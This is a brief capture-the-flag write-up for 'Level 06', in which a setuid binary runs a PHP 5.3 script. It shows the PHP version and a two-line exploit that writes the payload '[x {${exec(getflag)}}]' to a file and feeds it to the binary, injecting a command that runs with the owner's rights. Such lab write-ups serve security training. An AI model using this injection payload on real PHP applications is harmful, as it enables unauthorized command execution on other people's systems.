# Level 06

Now, we have PHP script who do string manipulation and a level06 executable owned by flag06 who execute level06.php.

```sh
$ php -v
PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54) 
Copyright (c) 1997-2012 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies
```

```sh
$ echo '[x {${exec(getflag)}}]' > /tmp/inject
$ ./level06 /tmp/inject
```